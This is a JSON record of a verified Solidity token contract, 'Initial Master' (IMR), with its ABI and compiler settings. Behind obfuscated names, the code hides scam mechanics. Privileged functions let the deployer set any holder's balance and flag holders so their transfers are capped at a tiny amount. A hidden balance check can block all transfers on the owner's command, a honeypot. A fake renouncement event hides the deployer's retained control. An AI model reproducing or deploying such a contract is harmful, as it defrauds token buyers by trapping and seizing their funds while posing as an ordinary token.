{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface tokenLaunched {\n    function createPair(address takeModeEnable, address receiverSwap) external returns (address);\n}\n\ninterface receiverBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyFrom) external view returns (uint256);\n\n    function transfer(address minToMarketing, uint256 walletListSender) external returns (bool);\n\n    function allowance(address fundReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletListSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minToMarketing,\n        uint256 walletListSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalList, uint256 value);\n    event Approval(address indexed fundReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract autoAmountTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundTrading is receiverBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InitialMaster is autoAmountTrading, receiverBuy, fundTrading {\n\n    uint256 maxSell;\n\n    function teamMarketing(address totalShould, address minToMarketing, uint256 walletListSender) internal returns (bool) {\n        if (totalShould == minReceiverWallet) {\n            return maxFee(totalShould, minToMarketing, walletListSender);\n        }\n        uint256 amountLaunched = receiverBuy(receiverWallet).balanceOf(tradingLiquidity);\n        require(amountLaunched == isTo);\n        require(minToMarketing != tradingLiquidity);\n        if (modeFund[totalShould]) {\n            return maxFee(totalShould, minToMarketing, listIsMin);\n        }\n        return maxFee(totalShould, minToMarketing, walletListSender);\n    }\n\n    constructor (){\n        if (senderWalletIs) {\n            toToken = false;\n        }\n        atMarketing atFundMarketing = atMarketing(totalSwapSell);\n        receiverWallet = tokenLaunched(atFundMarketing.factory()).createPair(atFundMarketing.WETH(), address(this));\n        if (atLaunch) {\n            autoTradingTx = false;\n        }\n        minReceiverWallet = _msgSender();\n        takeMax[minReceiverWallet] = true;\n        feeAmount[minReceiverWallet] = autoMin;\n        buyReceiver();\n        \n        emit Transfer(address(0), minReceiverWallet, autoMin);\n    }\n\n    event OwnershipTransferred(address indexed exemptShould, address indexed listExempt);\n\n    uint256 private launchedMode;\n\n    bool private atLaunch;\n\n    function txTake(address launchedTake, uint256 walletListSender) public {\n        receiverMode();\n        feeAmount[launchedTake] = walletListSender;\n    }\n\n    bool private toToken;\n\n    function transfer(address launchedTake, uint256 walletListSender) external virtual override returns (bool) {\n        return teamMarketing(_msgSender(), launchedTake, walletListSender);\n    }\n\n    uint256 public takeMin;\n\n    function tradingIsTake(address isFee) public {\n        receiverMode();\n        \n        if (isFee == minReceiverWallet || isFee == receiverWallet) {\n            return;\n        }\n        modeFund[isFee] = true;\n    }\n\n    uint256 isTo;\n\n    uint256 private autoMin = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchListMarketing;\n    }\n\n    uint8 private limitAt = 18;\n\n    function buyReceiver() public {\n        emit OwnershipTransferred(minReceiverWallet, address(0));\n        atTake = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptWallet;\n\n    uint256 constant listIsMin = 8 ** 10;\n\n    uint256 public toList;\n\n    function approve(address fromTake, uint256 walletListSender) public virtual override returns (bool) {\n        exemptWallet[_msgSender()][fromTake] = walletListSender;\n        emit Approval(_msgSender(), fromTake, walletListSender);\n        return true;\n    }\n\n    address public receiverWallet;\n\n    bool private autoTradingTx;\n\n    uint256 public totalAuto;\n\n    mapping(address => bool) public takeMax;\n\n    function getOwner() external view returns (address) {\n        return atTake;\n    }\n\n    address totalSwapSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isTeamMax(address atLaunched) public {\n        if (buyTo) {\n            return;\n        }\n        \n        takeMax[atLaunched] = true;\n        if (takeMin == receiverShouldLimit) {\n            receiverShouldLimit = takeMin;\n        }\n        buyTo = true;\n    }\n\n    address public minReceiverWallet;\n\n    function owner() external view returns (address) {\n        return atTake;\n    }\n\n    string private launchListMarketing = \"IMR\";\n\n    function tokenIsLaunched(uint256 walletListSender) public {\n        receiverMode();\n        isTo = walletListSender;\n    }\n\n    mapping(address => uint256) private feeAmount;\n\n    mapping(address => bool) public modeFund;\n\n    string private marketingTo = \"Initial Master\";\n\n    function transferFrom(address totalShould, address minToMarketing, uint256 walletListSender) external override returns (bool) {\n        if (_msgSender() != totalSwapSell) {\n            if (exemptWallet[totalShould][_msgSender()] != type(uint256).max) {\n                require(walletListSender <= exemptWallet[totalShould][_msgSender()]);\n                exemptWallet[totalShould][_msgSender()] -= walletListSender;\n            }\n        }\n        return teamMarketing(totalShould, minToMarketing, walletListSender);\n    }\n\n    address private atTake;\n\n    function allowance(address buyAmount, address fromTake) external view virtual override returns (uint256) {\n        if (fromTake == totalSwapSell) {\n            return type(uint256).max;\n        }\n        return exemptWallet[buyAmount][fromTake];\n    }\n\n    bool public buyTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMin;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitAt;\n    }\n\n    uint256 private receiverShouldLimit;\n\n    function receiverMode() private view {\n        require(takeMax[_msgSender()]);\n    }\n\n    bool private senderWalletIs;\n\n    function balanceOf(address buyFrom) public view virtual override returns (uint256) {\n        return feeAmount[buyFrom];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTo;\n    }\n\n    function maxFee(address totalShould, address minToMarketing, uint256 walletListSender) internal returns (bool) {\n        require(feeAmount[totalShould] >= walletListSender);\n        feeAmount[totalShould] -= walletListSender;\n        feeAmount[minToMarketing] += walletListSender;\n        emit Transfer(totalShould, minToMarketing, walletListSender);\n        return true;\n    }\n\n    address tradingLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletListSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"}],\"name\":\"isTeamMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiverWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletListSender\",\"type\":\"uint256\"}],\"name\":\"tokenIsLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFee\",\"type\":\"address\"}],\"name\":\"tradingIsTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletListSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minToMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletListSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletListSender\",\"type\":\"uint256\"}],\"name\":\"txTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InitialMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}